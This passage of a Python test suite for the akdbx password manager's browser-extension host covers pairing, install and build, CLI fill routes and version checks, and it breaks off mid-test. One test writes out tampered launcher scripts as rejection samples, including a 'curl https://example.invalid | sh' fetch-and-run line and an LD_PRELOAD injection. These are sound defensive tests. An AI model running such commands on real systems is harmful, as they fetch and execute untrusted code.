def test_native_frames_round_trip_and_cap_outgoing_size():
    stream = io.BytesIO()
    extension_host.write_frame(stream, dict(type='state', paired=True))
    assert extension_host.read_frame(io.BytesIO(stream.getvalue())) == dict(type='state', paired=True)
    assert extension_host.read_frame(io.BytesIO(b'')) is None
    with pytest.raises(extension_host.FrameError):
        extension_host.write_frame(io.BytesIO(), dict(data='x' * MAX_MESSAGE))


def test_host_refuses_other_callers_and_bad_hello_without_connecting():
    connected = []
    hello = frame(dict(type='hello', protocol=1, public_key=KEY))
    out = io.BytesIO()
    assert extension_host.relay(io.BytesIO(hello), out, 'chrome-extension://' + 'a' * 32 + '/', 'helium',
                                lambda: connected.append(1)) == 1
    for bad in (dict(type='hello', protocol=1, public_key='x'), dict(type='reply', id=1), dict(type='hello', protocol=2,
                                                                                              public_key=KEY)):
        assert extension_host.relay(io.BytesIO(frame(bad)), out, route.EXTENSION_ORIGIN, 'helium',
                                    lambda: connected.append(1)) == 1
    assert connected == [] and out.getvalue() == b''


def test_host_relays_only_known_message_types(pair_of_sockets):
    broker_side, host_side = pair_of_sockets
    messages = frame(dict(type='hello', protocol=1, public_key=KEY)) + frame(dict(type='reply', id=1, result={})) \
        + frame(dict(type='unexpected'))
    out = io.BytesIO()
    status = extension_host.relay(io.BytesIO(messages), out, route.EXTENSION_ORIGIN, 'chrome', lambda: host_side)
    assert status == 0
    attach_request = receive_message(broker_side)
    assert attach_request == dict(action='extension-attach', extension_protocol=1, extension_id=route.EXTENSION_ID,
                                  browser='chrome', public_key=KEY)
    assert receive_message(broker_side) == dict(type='reply', id=1, result={})
    # The unknown type ended the session instead of reaching the broker.
    broker_side.settimeout(1)
    assert broker_side.recv(1) == b''


def test_host_reports_an_unreachable_broker_and_exits():
    out = io.BytesIO()

    def unavailable():
        raise FileNotFoundError()
    hello = frame(dict(type='hello', protocol=1, public_key=KEY))
    assert extension_host.relay(io.BytesIO(hello), out, route.EXTENSION_ORIGIN, 'helium', unavailable) == 0
    assert extension_host.read_frame(io.BytesIO(out.getvalue())) == dict(type='state', connected=False,
                                                                         error='broker unavailable')


# ----- pairing page -----------------------------------------------------------------
class PageHandler:
    def __init__(self, path, command='GET', body=b'', origin='https://unlock.example.test:9443'):
        self.path, self.command = path, command
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(body)),
                        **({'Origin': origin} if origin else {})}
        self.rfile = io.BytesIO(body)
        self.sent = []

    def _identity(self):
        return 'synthetic user'

    def _token(self):
        from urllib.parse import parse_qs, urlsplit
        return parse_qs(urlsplit(self.path).query).get('token', [''])[0]

    def _expired(self):
        return False

    def _send(self, status, body, **_):
        self.sent.append((int(status), body.decode()))


@pytest.mark.parametrize('locked', [False, True])
def test_pairing_page_needs_the_master_password(locked):
    from akdbx.extension_web import handle_pairing
    from akdbx.web_unlock import UnlockState
    master = 'synthetic master'
    vault = SimpleNamespace(entries=[], password=master)
    broker = make_broker(locked=locked)
    if not locked:
        broker.vault = vault
    channel, _ = attach(broker, {}, paired=False)
    info = broker.extension._pairing_info(channel.digest)
    path = '/extension/pair?token=' + info['url'].split('token=')[1]

    def opener(_database, password, _keyfile):
        if password != master:
            raise CredentialsError('synthetic failure')
        return vault
    state = UnlockState(broker, None, None, opener)
    page = PageHandler(path)
    assert handle_pairing(page, state) and page.sent[0][0] == 200 and info['code'] in page.sent[0][1]
    wrong = PageHandler(path, 'POST', b'password=wrong&confirmed=yes')
    handle_pairing(wrong, state)
    assert wrong.sent[0][0] == 401 and broker.extension.approved == [] and broker.locked is locked
    no_origin = PageHandler(path, 'POST', b'password=synthetic+master&confirmed=yes', origin=None)
    handle_pairing(no_origin, state)
    assert no_origin.sent[0][0] == 400 and broker.extension.approved == []
    right = PageHandler(path, 'POST', b'password=synthetic+master&confirmed=yes')
    handle_pairing(right, state)
    assert right.sent[0][0] == 200 and broker.extension.approved == [channel.digest]
    assert broker.locked is False and master not in right.sent[0][1]
    assert not handle_pairing(PageHandler('/other'), state)


@pytest.mark.parametrize('locked', [False, True])
def test_pairing_failures_share_the_unlock_links_three_attempts(locked):
    from akdbx.extension_web import handle_pairing
    from akdbx.web_unlock import UnlockState
    master = 'synthetic master'
    vault = SimpleNamespace(entries=[], password=master)
    broker = make_broker(locked=locked)
    if not locked:
        broker.vault = vault
    channel, _ = attach(broker, {}, paired=False)
    info = broker.extension._pairing_info(channel.digest)
    path = '/extension/pair?token=' + info['url'].split('token=')[1]
    calls = []

    def opener(_database, password, _keyfile):
        calls.append(password)
        if password != master:
            raise CredentialsError('synthetic failure')
        return vault
    state = UnlockState(broker, None, None, opener, public_base='https://unlock.example.test:9443')
    broker.unlock_link = state
    statuses = []
    for _ in range(3):
        page = PageHandler(path, 'POST', b'password=wrong&confirmed=yes')
        handle_pairing(page, state)
        statuses.append(page.sent[0][0])
    assert statuses == [401, 401, 403] and state.blocked and broker.unlock_blocked
    # The block revoked the pairing link: even the right password fails.
    right = PageHandler(path, 'POST', b'password=synthetic+master&confirmed=yes')
    handle_pairing(right, state)
    assert right.sent[0][0] == 404 and broker.extension.pairings == {}
    assert broker.extension.approved == [] and broker.locked is locked
    assert len(calls) == (3 if locked else 0)
    # A pairing link made while blocked is not offered and cannot try a password.
    assert 'url' not in broker.extension._pairing_info(channel.digest)
    token = next(iter(broker.extension.pairings))
    for page in (PageHandler('/extension/pair?token=' + token),
                 PageHandler('/extension/pair?token=' + token, 'POST', b'password=synthetic+master&confirmed=yes')):
        handle_pairing(page, state)
        assert page.sent[0][0] == 403 and 'new unlock link' in page.sent[0][1]
    assert broker.extension.approved == [] and len(calls) == (3 if locked else 0)


def pairing_setup(*, locked=True, error=None):
    from akdbx.web_unlock import UnlockState
    master = 'synthetic master'
    vault = SimpleNamespace(entries=[], password=master)
    broker = make_broker(locked=locked)
    if not locked:
        broker.vault = vault
    channel, _ = attach(broker, {}, paired=False)
    info = broker.extension._pairing_info(channel.digest)
    path = '/extension/pair?token=' + info['url'].split('token=')[1]
    calls = []

    def opener(_database, password, _keyfile):
        calls.append(password)
        if error is not None:
            raise error
        if password != master:
            raise CredentialsError('synthetic failure')
        return vault
    state = UnlockState(broker, None, None, opener, public_base='https://unlock.example.test:9443')
    broker.unlock_link = state
    return broker, state, path, calls


RIGHT_PAIRING = b'password=synthetic+master&confirmed=yes'


@pytest.mark.parametrize('locked', [False, True])
def test_pairing_link_from_before_a_block_gets_no_new_budget(locked):
    # F3: a pairing link issued before the block must not work with the
    # replacement link's fresh attempts.
    from akdbx.extension_web import handle_pairing
    broker, state, path, calls = pairing_setup(locked=locked)
    for _ in range(3):
        state.record_failure(state.reserve_attempt())  # three failures on the unlock page
    assert state.blocked and broker.extension.pairings == {}
    assert broker.dispatch({'action': 'new-unlock-link', 'user_confirmed': True})['ok'] is True
    page = PageHandler(path, 'POST', RIGHT_PAIRING)
    handle_pairing(page, state)
    assert page.sent[0][0] == 404 and broker.extension.approved == []
    assert broker.locked is locked and calls == [] and state.remaining() == 3


def test_new_unlock_link_revokes_pairing_links_made_while_blocked():
    from akdbx.extension_web import handle_pairing
    broker, state, path, calls = pairing_setup()
    for _ in range(3):
        state.record_failure(state.reserve_attempt())
    channel = next(iter(broker.extension.channels.values()))
    broker.extension._pairing_info(channel.digest)  # a status call while blocked
    token = next(iter(broker.extension.pairings))
    assert broker.dispatch({'action': 'new-unlock-link', 'user_confirmed': True})['ok'] is True
    page = PageHandler('/extension/pair?token=' + token, 'POST', RIGHT_PAIRING)
    handle_pairing(page, state)
    assert page.sent[0][0] == 404 and calls == [] and broker.locked


def test_pairing_rechecks_its_link_just_before_the_password_check():
    # F3: the pairing link is revoked while this attempt waits its turn.
    from akdbx.extension_web import handle_pairing
    broker, state, path, calls = pairing_setup()
    page = PageHandler(path, 'POST', RIGHT_PAIRING)
    state.unlock_lock.acquire()
    worker = threading.Thread(target=handle_pairing, args=(page, state))
    try:
        worker.start()
        deadline = time.monotonic() + 5
        while not state.pending:
            assert time.monotonic() < deadline
            time.sleep(0.005)
        broker.extension.revoke_pairings()
    finally:
        state.unlock_lock.release()
        worker.join(5)
    assert page.sent[0][0] == 404 and calls == [] and broker.locked
    assert state.pending == set() and state.remaining() == 3


@pytest.mark.parametrize('body', [b'password=&confirmed=yes', b'confirmed=yes', b'password=x', b'password',
                                  # H5: parse_qs keeps an invalid escape as text; it must not count.
                                  b'password=wrong%zz&confirmed=yes', b'password=wrong%&confirmed=yes',
                                  b'password=wrong%4&confirmed=yes'])
def test_malformed_pairing_forms_use_no_attempt(body):
    from akdbx.extension_web import handle_pairing
    broker, state, path, calls = pairing_setup()
    for _ in range(4):
        page = PageHandler(path, 'POST', body)
        handle_pairing(page, state)
        assert page.sent[0][0] == 400
    assert calls == [] and state.remaining() == 3 and not state.blocked


def test_pairing_store_errors_do_not_count_as_failed_attempts():
    from akdbx.extension_web import handle_pairing
    broker, state, path, calls = pairing_setup(error=OSError('synthetic disk error'))
    for _ in range(4):
        page = PageHandler(path, 'POST', RIGHT_PAIRING)
        handle_pairing(page, state)
        assert page.sent[0][0] == 503 and 'could not open the vault' in page.sent[0][1]
        assert 'synthetic' not in page.sent[0][1]
    assert len(calls) == 4 and state.remaining() == 3 and not state.blocked and broker.locked


# ----- install and build -------------------------------------------------------------
def test_build_fills_the_content_script_from_the_cdp_route(tmp_path):
    from akdbx import browser_card, browser_password, card_processor
    built = extension_host.build(tmp_path / 'akdbx-extension', unlock_origin='https://localhost:9443/')
    assert 'AKDBX_TRUSTED_ORIGIN = "https://localhost:9443";' in (built / 'config.js').read_text()
    with pytest.raises(Exception):
        extension_host.build(tmp_path / 'insecure', unlock_origin='http://localhost:9443')
    manifest = json.loads((built / 'manifest.json').read_text())
    assert manifest['key'] == extension_host.EXTENSION_KEY and manifest['permissions'].count('nativeMessaging') == 1
    content = (built / 'content.js').read_text()
    assert '__' + 'PASSWORD_CAPTURE__' not in content
    for source in (browser_password.CAPTURE, browser_password.FILL, browser_card.PIN_SCRIPT, card_processor.GUARD):
        assert source in content
    # The manifest key determines the fixed extension ID.
    import base64
    digest = hashlib.sha256(base64.b64decode(manifest['key'])).hexdigest()[:32]
    assert ''.join(chr(ord('a') + int(c, 16)) for c in digest) == route.EXTENSION_ID
    extension_host.build(built)  # Updating the same extension folder is allowed.
    other = tmp_path / 'other'
    other.mkdir()
    (other / 'manifest.json').write_text('{}')
    with pytest.raises(ValueError):
        extension_host.build(other)


def test_launcher_quotes_paths_and_passes_the_browser_origin():
    text = extension_host._launcher_text('helium', '/opt/py thon/bin/python3', None)
    if extension_host.os.name == 'nt':
        assert '-I -m akdbx.extension_host --browser helium' in text and text.endswith('%*\r\n')
        with pytest.raises(ValueError):
            extension_host._launcher_text('chrome', 'C:\\a%PATH%\\python.exe', None)
    else:
        assert text.startswith('#!/bin/sh\nexec ') and "'/opt/py thon/bin/python3'" in text and text.endswith('"$@"\n')


# ----- CLI ------------------------------------------------------------------------------
def run_cli(monkeypatch, capsys, broker, argv):
    from akdbx import cli

    def request(_socket, payload, **_options):
        return json.loads(json.dumps(broker.dispatch(dict(payload))))
    monkeypatch.setattr(cli, 'request', request)
    status = cli.main(['--socket', 'unused', *argv])
    output = capsys.readouterr()
    return status, json.loads(output.out) if output.out.strip() else None, output.err


def test_cli_lists_pins_and_fills_through_the_extension_route(monkeypatch, capsys):
    broker = make_broker()
    channel, extension = attach(broker, {3: [Document('TOP', LOGIN)]})
    status, listing, _ = run_cli(monkeypatch, capsys, broker, ['list-password-frames', '--top-url', LOGIN,
                                                                '--route', 'extension'])
    assert status == 0 and listing['route'] == 'extension'
    status, pin, _ = run_cli(monkeypatch, capsys, broker, [
        'pin-password-target', '--page-id', listing['page_id'], '--frame-id', listing['main_frame_id'],
        '--top-url', LOGIN, '--selector', '#password', '--route', 'extension'])
    assert status == 0 and pin['target_delivery'] == route.DELIVERY
    status, receipt, _ = run_cli(monkeypatch, capsys, broker, ['fill', search(broker), '--mode', 'password',
                                                                '--target', pin['target']])
    assert status == 0 and receipt == dict(ok=True, filled='password', target_delivery=route.DELIVERY)
    assert extension.filled[0]['password'] == PASSWORD



def test_cli_pins_cards_on_the_extension_route_without_a_frame_url(monkeypatch, capsys):
    broker = make_broker([CardEntry()])
    channel, extension = attach(broker, {5: [Document('TOP', TOP)]})
    base = ['pin-card-target', '--page-id', f'{channel.id}.5', '--frame-id', 'TOP', '--top-url', TOP,
            '--selector', '#number', '--field', 'cc-number']
    status, refused, _ = run_cli(monkeypatch, capsys, broker, base)
    assert status == 1 and 'frame-url' in refused['error']  # The cdp route still needs it.
    status, pin, _ = run_cli(monkeypatch, capsys, broker, base + ['--route', 'extension'])
    assert status == 0 and pin['card_delivery'] == route.DELIVERY
    handle = broker.dispatch(dict(action='search-cards', card_protocol=1))['entries'][0]['handle']
    status, receipt, _ = run_cli(monkeypatch, capsys, broker, ['fill-card', handle, '--target', pin['target'],
                                                                '--field', 'cc-number'])
    assert status == 0 and receipt['card_delivery'] == route.DELIVERY


def test_cli_status_validates_pairing_links(monkeypatch, capsys):
    from akdbx import cli
    broker = make_broker()
    attach(broker, {}, paired=False)
    status, result, _ = run_cli(monkeypatch, capsys, broker, ['status'])
    assert status == 0 and result['extension_paired'] is False
    good = dict(ok=True, extension_pairing=[dict(browser='helium', code='ABCD-EFGH',
                                                 url='https://unlock.example.test:9443/extension/pair?token=x')])
    assert cli._validate_response(good, 'https://unlock.example.test:9443') == good
    for bad in ('https://elsewhere.example/extension/pair?token=x', 'https://unlock.example.test:9443/other?token=x'):
        with pytest.raises(Exception):
            cli._validate_response(dict(ok=True, extension_pairing=[dict(browser='helium', code='ABCD-EFGH', url=bad)]),
                                   'https://unlock.example.test:9443')


def test_install_and_uninstall_touch_only_their_own_files(tmp_path, monkeypatch):
    import os
    import uuid
    monkeypatch.setenv('LOCALAPPDATA', str(tmp_path / 'local'))
    monkeypatch.setenv('XDG_DATA_HOME', str(tmp_path / 'data'))
    monkeypatch.setenv('XDG_CONFIG_HOME', str(tmp_path / 'config'))
    monkeypatch.delenv('CHROME_CONFIG_HOME', raising=False)
    test_key = None
    if os.name == 'nt':
        import winreg
        test_key = 'Software\\akdbx-test-' + uuid.uuid4().hex[:8]
        monkeypatch.setitem(extension_host.WINDOWS_KEYS, 'helium', test_key + '\\NativeMessagingHosts')
    try:
        where = extension_host.install('helium')
        manifest = json.loads(open(where['manifest'], encoding='utf-8').read())
        assert manifest == dict(name=route.HOST_NAME, description=manifest['description'], path=where['launcher'],
                                type='stdio', allowed_origins=[route.EXTENSION_ORIGIN])
        if os.name == 'nt':
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, test_key + '\\NativeMessagingHosts\\' + route.HOST_NAME) as h:
                assert winreg.QueryValueEx(h, '')[0] == where['manifest']
        else:
            assert where['manifest'] == str(tmp_path / 'config' / 'net.imput.helium' / 'NativeMessagingHosts'
                                            / (route.HOST_NAME + '.json'))
            assert os.stat(where['launcher']).st_mode & 0o777 == 0o700
        extension_host.install('helium')  # Reinstalling the same registration is allowed.
        assert set(extension_host.uninstall('helium')) == ({'registry', 'manifest', 'launcher'} if os.name == 'nt'
                                                           else {'manifest', 'launcher'})
        assert not os.path.exists(where['manifest']) and not os.path.exists(where['launcher'])
        assert extension_host.uninstall('helium') == []
    finally:
        if test_key is not None:
            for key in (test_key + '\\NativeMessagingHosts\\' + route.HOST_NAME, test_key + '\\NativeMessagingHosts', test_key):
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key)
                except OSError:
                    pass


def test_install_replaces_only_its_own_launcher_and_never_writes_through_a_link(tmp_path, monkeypatch):
    # M11: a launcher that akdbx did not write is kept; a link at the launcher or manifest is refused.
    import os
    import uuid
    monkeypatch.setenv('LOCALAPPDATA', str(tmp_path / 'local'))
    monkeypatch.setenv('XDG_DATA_HOME', str(tmp_path / 'data'))
    monkeypatch.setenv('XDG_CONFIG_HOME', str(tmp_path / 'config'))
    monkeypatch.delenv('CHROME_CONFIG_HOME', raising=False)
    if os.name == 'nt':
        # Never registered: every refusal comes before the registry write.
        monkeypatch.setitem(extension_host.WINDOWS_KEYS, 'helium',
                            'Software\\akdbx-test-' + uuid.uuid4().hex[:8] + '\\NativeMessagingHosts')
    where = extension_host.paths('helium')
    launcher, manifest = where['launcher'], where['manifest']
    launcher.parent.mkdir(parents=True)
    launcher.write_text('#!/bin/sh\necho my own helper\n')
    with pytest.raises(ValueError, match='not written by akdbx'):
        extension_host.install('helium')
    assert launcher.read_text() == '#!/bin/sh\necho my own helper\n' and not manifest.exists()
    assert extension_host.uninstall('helium') == [] and launcher.exists()
    launcher.unlink()
    if os.name == 'nt':
        return
    ours = extension_host._launcher_text('helium', sys.executable, None)
    elsewhere = tmp_path / 'elsewhere.sh'
    elsewhere.write_text(ours)
    launcher.symlink_to(elsewhere)
    with pytest.raises(ValueError, match='is a link'):
        extension_host.install('helium')
    assert elsewhere.read_text() == ours and not manifest.exists()
    launcher.unlink()
    other = tmp_path / 'other-manifest.json'
    other.write_text(json.dumps({'path': str(launcher)}))
    manifest.parent.mkdir(parents=True)
    manifest.symlink_to(other)
    with pytest.raises(ValueError, match='is a link'):
        extension_host.install('helium')
    assert json.loads(other.read_text()) == {'path': str(launcher)} and not launcher.exists()
    manifest.unlink()
    extension_host.install('helium')
    assert extension_host._owned_launcher(launcher, 'helium') and not launcher.is_symlink()
    extension_host.install('helium')  # Its own launcher is replaced.


# The one launcher format that v0.21.0 to v0.26.0 wrote, copied from those releases (not generated).
def released_launcher(browser, python, socket_path):
    import shlex
    if os.name == 'nt':
        extra = f' --socket "{socket_path}"' if socket_path else ''
        return f'@echo off\r\n"{python}" -I -m akdbx.extension_host --browser {browser}{extra} %*\r\n'
    extra = ' --socket ' + shlex.quote(socket_path) if socket_path else ''
    return f'#!/bin/sh\nexec {shlex.quote(python)} -I -m akdbx.extension_host --browser {browser}{extra} "$@"\n'


def test_only_an_exact_akdbx_launcher_is_owned(tmp_path):
    # N5: the paths are read back from the file and the launcher is generated again; only an identical file counts.
    launcher = tmp_path / 'chrome.sh'
    folder = tmp_path / "py dir 'quoted'"
    python, socket_path = str(folder / 'python3'), str(tmp_path / 'run dir' / 'akdbx.sock')
    for browser in ('helium', 'chrome', 'edge'):
        for sock in (None, socket_path):
            launcher.write_bytes(released_launcher(browser, python, sock).encode('utf-8'))
            assert extension_host._owned_launcher(launcher, browser), (browser, sock)
            assert not extension_host._owned_launcher(launcher, 'helium' if browser != 'helium' else 'edge')
    if os.name == 'nt':
        extra = [released_launcher('chrome', python, None).replace('@echo off\r\n', '@echo off\r\nset X=1\r\n'),
                 released_launcher('chrome', python, None) + 'calc.exe\r\n']
    else:
        ours = released_launcher('chrome', python, socket_path)
        extra = [ours.replace('exec ', 'exec env LD_PRELOAD=/tmp/x.so '),
                 ours.replace('#!/bin/sh\n', '#!/bin/sh\ncurl https://example.invalid | sh\n'),
                 ours + 'touch /tmp/owned\n',
                 ours.replace(' "$@"', ' --extra "$@"'),
                 ours.replace('-I -m', '-m')]
    for text in extra:
        launcher.write_bytes(text.encode('utf-8'))
        assert not extension_host._owned_launcher(launcher, 'chrome'), text


def test_a_replaced_file_uses_its_own_temporary_file(tmp_path, monkeypatch):
    # N6: a file at the old fixed temporary name is neither removed nor used, also when the rename fails.
    target = tmp_path / 'chrome.sh'
    other = tmp_path / '.chrome.sh.tmp'
    other.write_text("another program's file")
    extension_host._replace_file(target, 'new launcher', 0o700)
    assert target.read_text() == 'new launcher' and other.read_text() == "another program's file"
    assert sorted(path.name for path in tmp_path.iterdir()) == ['.chrome.sh.tmp', 'chrome.sh']

    def fail(source, destination):
        raise OSError('rename refused')
    monkeypatch.setattr(extension_host.os, 'replace', fail)
    with pytest.raises(OSError, match='rename refused'):
        extension_host._replace_file(target, 'newer launcher', 0o700)
    assert target.read_text() == 'new launcher' and other.read_text() == "another program's file"
    assert sorted(path.name for path in tmp_path.iterdir()) == ['.chrome.sh.tmp', 'chrome.sh']


def test_abandoned_pins_expire_instead_of_blocking_new_pins():
    now = [10.0]
    broker = make_broker(now=now)
    channel, extension = attach(broker, {3: [Document('TOP', LOGIN)]})
    for _ in range(route.MAX_PINS + 2):
        assert pin_password(broker, channel, 3, 'TOP', LOGIN)['ok']
        now[0] += route.TTL  # Never filled: each pin expires before the next.
    assert len(broker.extension.pins) == 1 and len(extension.pins) == 1  # Released in the browser too.
    broker.card_targets.prune()
    assert not broker.extension.pins


def test_target_settings_reach_the_cdp_manager():
    broker = make_broker()
    broker.card_targets.clock = clock = lambda: 5.0
    broker.identity_targets.profile = 'synthetic-profile'
    assert broker.card_targets.cdp.clock is clock and broker.identity_targets.cdp.profile == 'synthetic-profile'
    assert broker.card_targets.kind == 'card'


def test_build_stores_the_browser_serialization_of_the_trusted_origin(tmp_path):
    built = extension_host.build(tmp_path / 'ext', unlock_origin='https://localhost:443')
    assert 'AKDBX_TRUSTED_ORIGIN = "https://localhost";' in (built / 'config.js').read_text()


def test_every_build_writes_a_new_build_id(tmp_path):
    # The extension drops broker trust saved under another build ID, so each build must write a new one.
    ids = []
    for origin in ('https://localhost:9443', 'https://localhost:9443', None):
        config = (extension_host.build(tmp_path / 'ext', unlock_origin=origin) / 'config.js').read_text()
        found = extension_host.BUILD_ID.findall(config)
        assert len(found) == 1 and len(found[0]) == 22
        ids.append(found[0])
    assert len(set(ids)) == 3


def test_sealed_match_list_stays_within_the_transport_limit():
    title = 'é' * 500  # Escaped as \u00e9 in JSON: six bytes per character.
    broker = make_broker([Entry(title=title + str(i), username=USERNAME, password=PASSWORD, url=LOGIN)
                          for i in range(20)])
    channel, _ = attach(broker, {})
    raw = broker.extension.popup(channel, dict(type='request', id='p1', op='match', kind='login', **facts()))
    framed = json.dumps(dict(type='response', id='p1', result=raw), separators=(',', ':')).encode()
    assert len(framed) <= MAX_MESSAGE
    entries = popup(broker, channel, 'match', kind='login', **facts())['entries']
    assert 0 < len(entries) < 20 and len(broker.extension.selections) == 2 * len(entries)


def test_expired_pairing_link_explains_how_to_get_a_new_one():
    from akdbx.extension_web import handle_pairing
    from akdbx.portal import render
    from akdbx.web_unlock import UnlockState
    broker = make_broker()
    page = PageHandler('/extension/pair?token=expired')
    assert handle_pairing(page, UnlockState(broker, None, None))
    status, body = page.sent[0]
    assert status == 404 and 'Open the pairing page' in body and 'ten minutes' in body
    assert b'<meta name="referrer" content="same-origin">' in render('x', '')


# ----- extension version ---------------------------------------------------------
FINGERPRINT_RECORD = Path(__file__).with_name('fill_extension_fingerprint.json')


def extension_fingerprint(folder):
    """SHA-256 over every built file except config.js, with line endings normalized."""
    digest = hashlib.sha256()
    for item in sorted(folder.iterdir(), key=lambda p: p.name):
        if item.name == 'config.js':
            continue
        data = item.read_bytes().replace(b'\r\n', b'\n')
        digest.update(item.name.encode() + b'\0' + hashlib.sha256(data).digest())
    return digest.hexdigest()


def version_tuple(text):
    return tuple(int(part) for part in text.split('.'))


def test_extension_version_changes_with_its_contents(tmp_path):
    """The fill extension has its own version; any change to what `extension build` writes needs a new one.

    Bump "version" in src/akdbx/fill_extension/manifest.json (patch: fix,
    minor: feature, major: protocol break), then run this test once with
    AKDBX_UPDATE_EXTENSION_FINGERPRINT=1 to record the new contents.
    """
    built = extension_host.build(tmp_path / 'ext', unlock_origin='https://localhost:9443')
    current = dict(version=route.EXTENSION_VERSION, sha256=extension_fingerprint(built))
    recorded = json.loads(FINGERPRINT_RECORD.read_text(encoding='utf-8'))
    if current == recorded:
        return
    newer = version_tuple(current['version']) > version_tuple(recorded['version'])
    if newer and os.environ.get('AKDBX_UPDATE_EXTENSION_FINGERPRINT') == '1':
        FINGERPRINT_RECORD.write_text(json.dumps(current, indent=2) + '\n', encoding='utf-8')
        return
    if current['version'] == recorded['version']:
        pytest.fail(f"the built fill extension changed but its version is still {current['version']}: bump "
                    '"version" in src/akdbx/fill_extension/manifest.json (patch for fixes, minor for features, '
                    'major for protocol breaks), then run this test once with AKDBX_UPDATE_EXTENSION_FINGERPRINT=1')
    if not newer:
        pytest.fail(f"the fill extension version went back from {recorded['version']} to {current['version']}")
    pytest.fail(f"the fill extension version is now {current['version']} but {FINGERPRINT_RECORD.name} still "
                f"records {recorded['version']}: run this test once with AKDBX_UPDATE_EXTENSION_FINGERPRINT=1")


def test_build_stamps_the_extension_version_with_its_contents_and_reports_it(tmp_path, capsys):
    built = extension_host.build(tmp_path / 'ext', unlock_origin='https://localhost:9443')
    manifest = json.loads((built / 'manifest.json').read_text())
    # MAJOR.MINOR.PATCH from the source manifest, then 16 bits of the content hash.
    assert manifest['version'] == BUILT and BUILT.startswith(route.EXTENSION_VERSION + '.')
    assert 0 <= int(BUILT.rsplit('.', 1)[1]) <= 65535 and route.valid_extension_version(BUILT)
    assert 'version_name' not in manifest  # chrome://extensions shows the full version.
    assert f'globalThis.AKDBX_EXTENSION_VERSION = "{BUILT}";' in (built / 'config.js').read_text()
    assert route.EXTENSION_VERSION_FORMAT.fullmatch(route.EXTENSION_VERSION)
    assert version_tuple(route.EXTENSION_VERSION) >= (0, 1, 0)
    args = SimpleNamespace(extension_command='build', output=tmp_path / 'cli')
    assert extension_host.run(args, unlock_origin='https://localhost:9443') == 0
    assert json.loads(capsys.readouterr().out)['extension_version'] == BUILT
    assert json.loads((tmp_path / 'cli' / 'manifest.json').read_text())['version'] == BUILT
    assert extension_host.run(SimpleNamespace(extension_command='info')) == 0
    assert json.loads(capsys.readouterr().out)['extension_version'] == BUILT


def test_other_extension_contents_give_another_build_version(monkeypatch):
    """Chrome loads a new worker only for a new manifest version; the test host name does not count."""
    real = extension_host._source_files
    assert extension_host.built_version() == BUILT
    try:
        monkeypatch.setattr(extension_host, '_source_files',
                            lambda host_name=route.HOST_NAME: {**real(host_name), 'background.js': b'// other'})
        extension_host.built_version.cache_clear()
        other = extension_host.built_version()
        assert other != BUILT and other.startswith(route.EXTENSION_VERSION + '.')
        monkeypatch.setattr(extension_host, '_source_files',
                            lambda host_name=route.HOST_NAME: {**real(host_name), 'background.js':
                                                               real()['background.js'].replace(b'\r\n', b'\n')
                                                               .replace(b'\n', b'\r\n')})
        extension_host.built_version.cache_clear()
        assert extension_host.built_version() == BUILT  # A CRLF checkout builds the same version.
    finally:
        monkeypatch.undo()
        extension_host.built_version.cache_clear()
    assert extension_host.built_version() == BUILT


def test_a_build_for_a_test_host_keeps_the_version_of_the_shipped_contents(tmp_path):
    built = extension_host.build(tmp_path / 'ext', host_name='org.akdbx.test_x', unlock_origin='https://localhost:9443')
    assert b'org.akdbx.test_x' in (built / 'background.js').read_bytes()
    assert json.loads((built / 'manifest.json').read_text())['version'] == BUILT


@pytest.mark.parametrize('version, worker_stale, status', [
    (OTHER_BUILD, False, 'mismatch'), (route.EXTENSION_VERSION, False, 'mismatch'), (BUILT, True, 'stale')])
def test_a_stale_or_mismatched_worker_gets_no_frame_list_and_no_pin_and_the_error_names_the_fix(
        version, worker_stale, status):
    """A worker that Chrome kept from another build pins fine but fails later fills: refuse it at the start."""
    broker = make_broker([CardEntry()])
    extension = FakeExtension({3: [Document('TOP', LOGIN)], 5: [Document('TOP', TOP)]})
    channel = FakeChannel(broker.extension, extension, version=version)
    channel.stale = worker_stale
    broker.extension.channels[channel.id] = channel
    broker.extension.approved.append(channel.digest)
    state = broker.dispatch(dict(action='ping'))
    assert state['extension_paired'] is True
    assert state['extension_browsers'] == [dict(browser='helium', paired=True, version=version, version_status=status)]
    # A stale worker: restart or reload. Another build than the broker's: rebuild with this akdbx.
    error = route.STALE if status == 'stale' else route.MISMATCH.format(loaded=version, expected=BUILT)
    for result in (broker.dispatch(dict(action='list-password-frames', password_protocol=1, frame_protocol=1,
                                        top_url=LOGIN, route='extension')),
                   pin_password(broker, channel, 3, 'TOP', LOGIN),
                   card_pin(broker, channel, 'TOP')):
        assert result == dict(ok=False, error=error)
    assert 'chrome://extensions' in error and 'pair it again' in error
    assert ('restart the browser' in error) == (status == 'stale')
    assert ('akdbx --unlock-origin ORIGIN extension build' in error and version in error) == (status == 'mismatch')
    # Only the frame list reached the worker (it counts the browser's tabs with the URL); never a pin.
    assert extension.calls == ['frames'] and broker.extension.pins == {}


def paired(broker, tabs, browser, version=BUILT, stale=False):
    extension = FakeExtension(tabs)
    channel = FakeChannel(broker.extension, extension, browser=browser, version=version)
    channel.stale = stale
    broker.extension.channels[channel.id] = channel
    broker.extension.approved.append(channel.digest)
    return channel, extension


def worker_says_stale(extension):
    """The worker found a newer build on disk: frame lists answer stale with the count of matching tabs."""
    handle = extension.handle

    def answer(op, payload):
        if op == 'frames':
            extension.calls.append(op)
            return dict(ok=False, error='stale', tabs=sum(docs[0].url == payload['top_url']
                                                          for docs in extension.tabs.values()))
        return handle(op, payload)
    extension.handle = answer


@pytest.mark.parametrize('refused', ['stale', 'mismatch', 'worker'])
def test_a_refused_browser_neither_hides_nor_borrows_a_page_in_another_paired_browser(refused):
    broker = make_broker()
    current, _ = paired(broker, {3: [Document('TOP', LOGIN)]}, 'helium')
    other = {'stale': dict(stale=True), 'mismatch': dict(version=OTHER_BUILD), 'worker': {}}[refused]
    channel, extension = paired(broker, {7: [Document('TOP', 'https://other.example.org/')]}, 'chrome', **other)
    if refused == 'worker':
        worker_says_stale(extension)
    error = (route.MISMATCH.format(loaded=OTHER_BUILD, expected=BUILT) if refused == 'mismatch' else route.STALE)
    request = dict(action='list-password-frames', password_protocol=1, frame_protocol=1, top_url=LOGIN,
                   route='extension')
    # The URL is open only in the current browser: it lists and pins there.
    listing = broker.dispatch(request)
    assert listing['ok'] is True and listing['page_id'] == current.id + '.3'
    assert pin_password(broker, current, 3, 'TOP', LOGIN)['ok'] is True
    # Open only in the refused browser, or in both: the refusal, never the other browser's tab.
